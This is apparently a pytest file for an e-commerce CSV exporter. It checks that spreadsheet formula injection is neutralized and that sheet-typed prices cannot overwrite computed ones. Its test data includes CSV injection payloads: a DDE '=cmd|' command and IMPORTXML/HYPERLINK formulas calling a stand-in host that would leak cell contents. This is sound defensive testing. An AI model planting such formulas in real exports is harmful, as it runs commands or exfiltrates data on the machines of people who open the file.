"""
CSV formula injection: a cell that Excel/Sheets executes instead of displaying.

WHY THIS EXISTS
---------------
The operator opens every generated CSV in a spreadsheet before importing it.
A cell whose text begins with `=`, `+`, `-` or `@` is not text to Excel or
Google Sheets -- it is a formula, evaluated on open. `=HYPERLINK(...)`,
`=IMPORTXML(...)` and the DDE form `=cmd|'/c calc'!A1` all run from a cell
nobody clicked.

The codebase already knows this: RawProductInput._validate_existing_id
documents rejecting "=1+1" in the ID column. But the passthrough overlay puts
28 columns of operator-supplied text straight into the row, and scraped source
text reaches Description, so the ID check covers one column out of fifty-one.

The rule has to distinguish a formula from a number. `Published` ships as
"-1" and `Position` as "0"; escaping those would corrupt every import, so a
value that parses as a plain number is left exactly as it is.
"""
from decimal import Decimal
from uuid import uuid4

import pytest

from app.builders.csv_assembler import COLUMN_ORDER, assemble_csv_row, generate_csv_file
from app.builders.html_sanitizer import neutralize_csv_formula
from app.graph.state import PipelineState
from app.models.raw_input import RawProductInput

DANGEROUS = [
    "=1+1",
    "=cmd|'/c calc'!A1",
    '=HYPERLINK("http://evil.pk","Click")',
    '=IMPORTXML(CONCAT("http://evil.pk/?v=",A1),"//a")',
    "+1+1",
    "-1+1",
    "@SUM(A1:A9)",
    "  =1+1",  # leading whitespace does not make it safe in every reader
]

# Values that LOOK like they start with a trigger but are ordinary data. These
# must come through byte-identical -- the row is full of them.
SAFE = [
    "-1",       # Published
    "0",        # Position, Download limit
    "-1.5",
    "+92",      # a Pakistani dialling code in a purchase note
    "1200",
    "10",
    "",
    "Haier HSU-12 Air Conditioner",
    "https://kiachahiye.pk/product/x",
    "<ul><li>1200 W motor</li></ul>",
]


@pytest.mark.parametrize("value", DANGEROUS)
def test_a_formula_is_neutralized(value):
    out = neutralize_csv_formula(value)
    assert out.startswith("'"), f"{value!r} would execute when the sheet is opened"
    assert out == "'" + value, "the original text must be preserved, only prefixed"


@pytest.mark.parametrize("value", SAFE)
def test_ordinary_data_is_untouched(value):
    assert neutralize_csv_formula(value) == value


def test_neutralizing_twice_does_not_double_prefix():
    """The guard runs at both the row and the file boundary; it has to be idempotent."""
    once = neutralize_csv_formula("=1+1")
    assert neutralize_csv_formula(once) == once


def _state(**passthrough) -> PipelineState:
    raw_input = RawProductInput(
        sku="S1", model_number="M1", brand_name="Haier", category_name="AC",
        product_type="Air Conditioner", regular_price=Decimal(100), sale_price=Decimal(90),
        passthrough_columns=passthrough or None,
    )
    return PipelineState(
        product_id=uuid4(), batch_id=uuid4(), raw_input=raw_input,
        name="Haier M1 AC", short_description="x", description="d",
        specs_table_html="<table></table>", resolved_warranty_phrase="1-Year",
    )


def test_a_passthrough_formula_is_neutralized_in_the_row():
    """The realistic path: the operator's sheet carries a formula in an allowed column."""
    row = assemble_csv_row(
        _state(**{"Purchase note": "=cmd|'/c calc'!A1"}),
        "Electronics > AC", "Haier", canonical_category_path="Electronics > AC",
    )
    assert row["Purchase note"] == "'=cmd|'/c calc'!A1"


def test_scraped_text_reaching_a_description_is_neutralized():
    state = _state()
    state.description = "=IMPORTXML(\"http://evil.pk\",\"//a\")"
    row = assemble_csv_row(
        state, "Electronics > AC", "Haier", canonical_category_path="Electronics > AC",
    )
    assert row["Description"].startswith("'=")


def test_the_generated_row_keeps_its_negative_flags():
    """Regression guard: over-escaping breaks every WooCommerce import."""
    row = assemble_csv_row(
        _state(), "Electronics > AC", "Haier", canonical_category_path="Electronics > AC",
    )
    assert row["Published"] == "-1", "Published was escaped and would import as text"
    assert row["Position"] == "0"


def test_the_file_writer_neutralizes_rows_built_elsewhere():
    """generate_csv_file is the last boundary; not every row comes from assemble_csv_row."""
    row = {col: "" for col in COLUMN_ORDER}
    row["Name"] = "=1+1"
    row["Published"] = "-1"

    out = generate_csv_file([row])

    assert '"\'=1+1"' in out
    assert '"-1"' in out, "a numeric flag was escaped by the file writer"


# ---------------------------------------------------------------------------
# PRICES ARE NEVER TAKEN FROM PASSTHROUGH.
#
# Found by running the real Anex sheet end to end. The sheet writes prices the
# way a person types them -- "1,550" -- and "Sale price" was in
# PASSTHROUGH_ALLOWED, so that raw string overwrote the number the pipeline had
# already computed. The exported row read:
#
#     Regular price   1860.0        <- computed, correct
#     Sale price      '1,550'       <- the sheet's text, with a thousands comma
#
# WooCommerce parses prices with a locale-specific decimal separator; a comma
# either fails the import or is read as a decimal point, turning Rs 1,550 into
# Rs 1.55. Every product in a 296-row run carried it.
#
# The overlay is also redundant here: _resolve_prices already reads those exact
# columns, strips the formatting, applies the operator's markup rule and the
# sale-below-regular check. Letting the raw cell win discards all of that.
# ---------------------------------------------------------------------------

def test_a_comma_formatted_sheet_price_never_reaches_the_row():
    """THE BUG, with the real value from the Anex sheet."""
    row = assemble_csv_row(
        _state(**{"Sale Price": "1,550", "Regular Price": "1,860"}),
        "Electronics > AC", "Haier", canonical_category_path="Electronics > AC",
    )
    assert row["Sale price"] == 90.0, "the sheet's raw text overwrote the computed price"
    assert row["Regular price"] == 100.0
    for column in ("Sale price", "Regular price"):
        assert "," not in str(row[column]), f"{column} carries a thousands separator"


@pytest.mark.parametrize("column", ["Sale price", "Regular price"])
def test_prices_are_not_passthrough_columns(column: str):
    """
    Guards the allowlist directly. A behavioural test alone would not stop
    someone re-adding the entry, and the failure is silent in the CSV.
    """
    from app.builders.csv_assembler import PASSTHROUGH_ALLOWED

    assert column not in PASSTHROUGH_ALLOWED, (
        f"{column!r} is passthrough-writable, so the sheet's raw text overwrites "
        f"the price _resolve_prices computed -- including its thousands commas"
    )


def test_the_computed_prices_are_numbers_not_strings():
    """WooCommerce wants a bare number; a string is where the comma sneaks in."""
    row = assemble_csv_row(
        _state(), "Electronics > AC", "Haier", canonical_category_path="Electronics > AC",
    )
    assert isinstance(row["Regular price"], float)
    assert isinstance(row["Sale price"], float)
